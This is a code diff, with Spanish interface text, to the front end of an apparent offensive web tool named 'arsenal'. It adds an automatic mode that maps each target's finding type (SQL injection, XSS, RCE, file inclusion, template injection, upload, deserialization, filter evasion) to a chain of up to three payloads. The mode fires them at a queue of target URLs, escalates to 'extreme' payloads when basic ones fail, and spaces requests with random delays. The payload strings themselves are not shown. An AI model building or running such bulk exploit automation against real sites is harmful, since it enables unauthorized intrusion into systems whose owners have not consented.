@@ -177,6 +177,10 @@
           <input type="checkbox" id="stopImpact" checked style="width:1rem;height:1rem;accent-color:var(--red)" />
           🛑 stop al primer impacto confirmado (demostración mínima)
         </label>
+        <label style="display:flex;align-items:center;gap:0.4rem;color:var(--text);font-size:0.8rem">
+          <input type="checkbox" id="autoMode" checked style="width:1rem;height:1rem;accent-color:var(--green)" />
+          🤖 AUTO: elijo el payload por el tipo de hallazgo de cada blanco y escalo solo si el básico no confirma (máx 3 por blanco)
+        </label>
       </div>
     </div>
 
@@ -332,46 +336,93 @@
       btn.disabled = true;
       document.getElementById("result").style.display = "block";
 
-      let conf = 0, lento = 0, refl = 0, errs = 0, out = "";
-      for (let i = 0; i < lines.length; i++) {
-        btn.textContent = `🔥 ${i + 1}/${lines.length}...`;
-        const target = lines[i];
-        out += `── [${i + 1}/${lines.length}] ${target}\n`;
-        try {
-          const { ok, d } = await fireOne(target, SELECTED);
-          if (!ok) { errs++; out += "   ERROR: " + (d.error || d.status) + "\n"; }
-          else {
-            const head = pintaRes(d, SELECTED);
-            if (d.elapsed_ms > 3000) lento++;
-            if (d.reflejado) refl++;
-            if (confirmo(SELECTED, d)) conf++;
-            out += `   estado ${d.status_code} · ${d.elapsed_ms}ms · reflejado: ${d.reflejado ? "SÍ" : "no"}\n`;
-            out += (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(SELECTED.payload))
-              ? "   💥 CONFIRMADO (ciego temporal)\n" : "";
-            if (i === lines.length - 1) out += "\n" + head;
-            if (stop && confirmo(SELECTED, d)) {
-              out += `\n🛑 STOP: impacto confirmado en el blanco ${i + 1} (demostración mínima).`;
-              break;
+      // cola efectiva: respeta tipos de la cola del hunter; si el usuario edito el textarea, sin tipos
+      let cola = TARGETS.length && TARGETS.map(x => x.url).join("\n") === raw
+        ? TARGETS : lines.map(u => ({ url: u, tipo: "" }));
+      const auto = document.getElementById("autoMode").checked;
+      if (auto && !cola.some(t => t.tipo)) cola = cola.map(t => ({ ...t, tipo: "" }));
+      if (auto && !SELECTED && !cola.some(t => catDeTipo(t.tipo))) {
+        btn.disabled = false; btn.textContent = "🔥 LANZAR AL BLANCO";
+        return alert("AUTO no reconoce el tipo de los hallazgos: elegí una cajita a mano o desactivá AUTO");
+      }
+      if (!auto && !SELECTED) {
+        btn.disabled = false; btn.textContent = "🔥 LANZAR AL BLANCO";
+        return alert("Elegí un payload o activá AUTO");
+      }
+      let conf = 0, lento = 0, refl = 0, errs = 0, escalados = 0, out = "";
+      for (let i = 0; i < cola.length; i++) {
+        const t = cola[i];
+        const cadena = auto && catDeTipo(t.tipo) ? cadenaDe(catDeTipo(t.tipo))
+                       : SELECTED ? [SELECTED] : [];
+        for (let k = 0; k < cadena.length; k++) {
+          const sel = cadena[k];
+          btn.textContent = `🔥 ${i + 1}/${cola.length} · ${sel.nombre}`;
+          out += k === 0 ? `── [${i + 1}/${cola.length}] ${t.url}${t.tipo ? "  (tipo: " + t.tipo + ")" : ""}\n`
+                         : `   ↗ escalando a [${sel.nombre}]\n`;
+          try {
+            const { ok, d } = await fireOne(t.url, sel);
+            if (!ok) { errs++; out += "   ERROR: " + (d.error || d.status) + "\n"; }
+            else {
+              const head = pintaRes(d, sel);
+              if (d.elapsed_ms > 3000) lento++;
+              if (d.reflejado) refl++;
+              out += `   [${sel.nombre}] estado ${d.status_code} · ${d.elapsed_ms}ms · reflejado: ${d.reflejado ? "SÍ" : "no"}\n`;
+              const c = confirmo(sel, d);
+              if (c) {
+                conf++;
+                out += (d.elapsed_ms > 3000 && /sleep|benchmark|waitfor|blob/i.test(sel.payload))
+                  ? "   💥 CONFIRMADO (ciego temporal)\n" : "   💥 CONFIRMADO\n";
+                if (i === cola.length - 1) out += "\n" + head;
+                break;  // este blanco ya confirmo: no seguir escalando
+              }
             }
-          }
-        } catch (e) { errs++; out += "   error: " + e.message + "\n"; }
+          } catch (e) { errs++; out += "   error: " + e.message + "\n"; }
+          if (k < cadena.length - 1) await sleep(400 + Math.floor(Math.random() * 400));
+        }
         document.getElementById("rBody").textContent = out;
         document.getElementById("rBody").scrollTop = 1e9;
-        if (i < lines.length - 1) await sleep(400 + Math.floor(Math.random() * 400));
+        if (stop && conf > 0) {
+          out += `\n🛑 STOP: impacto confirmado en el blanco ${i + 1} (demostración mínima).`;
+          break;
+        }
+        if (i < cola.length - 1) await sleep(400 + Math.floor(Math.random() * 400));
       }
-      out += `\n═══ LOTE: ${lines.length} blancos · 💥 confirmados: ${conf} · lentos(>3s): ${lento} · reflejados: ${refl} · errores: ${errs} ═══`;
+      out += `\n═══ LOTE: ${cola.length} blancos · 💥 confirmados: ${conf} · lentos(>3s): ${lento} · reflejados: ${refl} · errores: ${errs} ═══`;
       document.getElementById("rBody").textContent = out;
       document.getElementById("rBody").scrollTop = 1e9;
       btn.disabled = false; btn.textContent = "🔥 LANZAR AL BLANCO";
     }
 
+    let TARGETS = [];  // {url, tipo}
     try {
-      const pre = sessionStorage.getItem("arsenal_targets");
-      if (pre) {
-        document.getElementById("targetsBox").value = JSON.parse(pre).join("\n");
-        sessionStorage.removeItem("arsenal_targets");
+      const q = sessionStorage.getItem("arsenal_queue");
+      if (q) {
+        TARGETS = JSON.parse(q).filter(x => x && x.url);
+        document.getElementById("targetsBox").value = TARGETS.map(x => x.url).join("\n");
+        sessionStorage.removeItem("arsenal_queue");
       }
     } catch (e) {}
+
+    // mapea el tipo de hallazgo del hunter a categoria del arsenal
+    function catDeTipo(tipo) {
+      const t = (tipo || "").toLowerCase();
+      if (/sql/.test(t)) return "sql";
+      if (/xss|script/.test(t)) return "xss";
+      if (/rce|cmd|comando/.test(t)) return "rce";
+      if (/lfi|inclusi|file/.test(t)) return "lfi";
+      if (/ssti|plantilla/.test(t)) return "ssti";
+      if (/upload|subida/.test(t)) return "upload";
+      if (/deser|serial/.test(t)) return "deser";
+      if (/waf|filtro|evasi/.test(t)) return "evasion";
+      return null;
+    }
+
+    // cadena minima para un tipo: basicos primero, max 3, escalar solo lo necesario
+    function cadenaDe(cat) {
+      const its = PAYLOADS.filter(p => p.cat === cat && p.payload && !p.payload.startsWith("🔒"));
+      its.sort((a, b) => (a.extremo ? 1 : 0) - (b.extremo ? 1 : 0));
+      return its.slice(0, 3);
+    }
 
     fetch("/api/status").then(r => r.json()).then(d => {
       document.getElementById("appVersion").textContent = "v" + (d.version || "?");
